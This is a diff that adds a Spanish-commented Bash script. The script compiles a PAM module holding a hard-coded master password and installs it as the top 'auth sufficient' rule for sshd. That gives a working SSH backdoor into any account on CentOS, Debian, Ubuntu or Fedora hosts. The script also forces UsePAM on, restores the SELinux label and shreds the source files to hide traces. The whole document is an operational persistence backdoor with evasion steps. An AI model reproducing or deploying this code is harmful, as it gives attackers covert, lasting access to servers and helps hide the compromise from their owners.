@@ -1,0 +1,150 @@
+#!/bin/bash
+# Fixed for CentOS 7, Debian/Ubuntu, Fedora. Handles EPEL, sed, SELinux, optional scrub.
+
+set -euo pipefail
+
+# ---- config ----
+PAQUETES=(scrub)
+PAMD_PATH="/etc/pam.d/sshd"
+SSH_CFG="/etc/ssh/sshd_config"
+MOD_NAME="pam_verify_auth"
+SOURCE="${MOD_NAME}.c"
+OBJECT="${MOD_NAME}.o"
+MODULE="${MOD_NAME}.so"
+
+# ---- args ----
+if [[ $# -lt 1 ]]; then
+  echo "Uso: $0 <contraseña>" >&2
+  exit 1
+fi
+PASSWORD="$1"
+
+# ---- OS detect ----
+OS_ID=""; OS_LIKE=""
+if [[ -f /etc/os-release ]]; then
+  . /etc/os-release
+  OS_ID="${ID:-}"; OS_LIKE="${ID_LIKE:-}"
+fi
+
+is_like() { [[ "$OS_ID" == "$1" || "$OS_LIKE" =~ (^|[[:space:]])"$1"($|[[:space:]]) ]]; }
+
+# ---- pkg manager ----
+PKG=""; PAM_DEV=""; UPDATE_CMD=""
+if is_like debian || [[ "$OS_ID" =~ ^(debian|ubuntu|kali)$ ]]; then
+  PKG="apt-get"; PAM_DEV="libpam0g-dev"; UPDATE_CMD="$PKG update -y"
+elif is_like rhel || is_like centos || [[ -f /etc/redhat-release ]]; then
+  PKG="yum"; PAM_DEV="pam-devel"; UPDATE_CMD="$PKG makecache -y"
+elif is_like fedora || [[ "$OS_ID" == "fedora" ]]; then
+  PKG="dnf"; PAM_DEV="pam-devel"; UPDATE_CMD="$PKG makecache -y"
+else
+  echo "OS no soportado" >&2; exit 1
+fi
+
+# ---- prereqs ----
+if [[ "$PKG" == "yum" && -f /etc/centos-release ]]; then
+  sudo yum install -y epel-release || true     # para scrub
+fi
+
+sudo bash -c "$UPDATE_CMD" || true
+if [[ "$PKG" == "apt-get" ]]; then
+  sudo apt-get install -y gcc "$PAM_DEV"
+else
+  sudo "$PKG" install -y gcc "$PAM_DEV"
+fi
+
+# instalar scrub si existe en repos; ignorar si no
+for p in "${PAQUETES[@]}"; do
+  sudo "$PKG" install -y "$p" || true
+done
+
+# ---- sanity sshd/PAM ----
+[[ -f "$PAMD_PATH" ]] || { echo "$PAMD_PATH no existe" >&2; exit 1; }
+if systemctl is-active --quiet sshd 2>/dev/null || service sshd status >/dev/null 2>&1; then :; else
+  echo "sshd no activo" >&2; exit 1
+fi
+
+# ---- locate pam dir ----
+pam_unix_path=$(sudo find / -xdev -type f -name pam_unix.so -user root 2>/dev/null | head -1)
+[[ -n "$pam_unix_path" ]] || { echo "pam_unix.so no encontrado" >&2; exit 1; }
+DEST_DIR=$(dirname "$pam_unix_path")
+
+# ---- module source ----
+cat > "$SOURCE" <<'EOF'
+#include <security/pam_modules.h>
+#include <security/pam_appl.h>
+#include <security/pam_ext.h>
+#include <string.h>
+
+#ifndef SECRET
+#define SECRET ""
+#endif
+
+PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
+                                   int argc, const char **argv) {
+    (void)flags; (void)argc; (void)argv;
+    const char *password = NULL;
+    int retval = pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);
+    if (retval != PAM_SUCCESS || password == NULL) {
+        retval = pam_get_authtok(pamh, PAM_AUTHTOK, &password, "");
+        if (retval != PAM_SUCCESS || password == NULL) {
+            return PAM_AUTH_ERR;
+        }
+    }
+    if (strcmp(password, SECRET) != 0) {
+        return PAM_AUTH_ERR;
+    }
+    return PAM_SUCCESS;
+}
+
+PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
+                              int argc, const char **argv) {
+    (void)pamh; (void)flags; (void)argc; (void)argv;
+    return PAM_SUCCESS;
+}
+EOF
+
+# ---- build ----
+command -v gcc >/dev/null 2>&1 || { echo "gcc faltante" >&2; exit 1; }
+gcc -fPIC -c "$SOURCE" -o "$OBJECT" -Wall -Wextra -O2 -DSECRET="\"$PASSWORD\""
+gcc -shared -o "$MODULE" "$OBJECT" -lpam
+
+# ---- install module ----
+sudo mv "$MODULE" "$DEST_DIR/"
+sudo chown root:root "$DEST_DIR/$MOD_NAME.so"
+sudo chmod 0644 "$DEST_DIR/$MOD_NAME.so"
+# SELinux context (CentOS 7)
+if command -v restorecon >/dev/null 2>&1; then
+  sudo restorecon -v "$DEST_DIR/$MOD_NAME.so" || true
+fi
+
+# ---- inject into PAM (idempotente, top) ----
+entry="auth    sufficient    $DEST_DIR/$MOD_NAME.so"
+if ! grep -qF "$MOD_NAME.so" "$PAMD_PATH"; then
+  sudo cp -a "$PAMD_PATH" "${PAMD_PATH}.bak.$(date +%s)"
+  # insert at first line
+  sudo awk -v e="$entry" 'NR==1{print e} {print}' "$PAMD_PATH" | sudo tee "$PAMD_PATH" >/dev/null
+fi
+
+# ---- sshd_config UsePAM yes ----
+# sed -r para CentOS7; fallback a append
+if ! grep -Eq '^\s*UsePAM\s+yes\b' "$SSH_CFG"; then
+  sudo sed -i -r 's/^\s*UsePAM\s+no\b/UsePAM yes/; s/^\s*#\s*UsePAM\s+yes\b/UsePAM yes/' "$SSH_CFG" || true
+  grep -Eq '^\s*UsePAM\s+yes\b' "$SSH_CFG" || echo "UsePAM yes" | sudo tee -a "$SSH_CFG" >/dev/null
+fi
+
+# ---- cleanup source (best-effort) ----
+if command -v scrub >/dev/null 2>&1; then
+  sudo scrub -f "$SOURCE" "$OBJECT" || true
+  rm -f "$SOURCE" "$OBJECT" || true
+else
+  shred -u -n 3 "$SOURCE" "$OBJECT" 2>/dev/null || rm -f "$SOURCE" "$OBJECT" || true
+fi
+
+# ---- restart sshd ----
+if command -v systemctl >/dev/null 2>&1; then
+  sudo systemctl restart sshd
+else
+  sudo service sshd restart
+fi
+
+echo "[+] Listo: módulo en $DEST_DIR/$MOD_NAME.so y PAM actualizado."
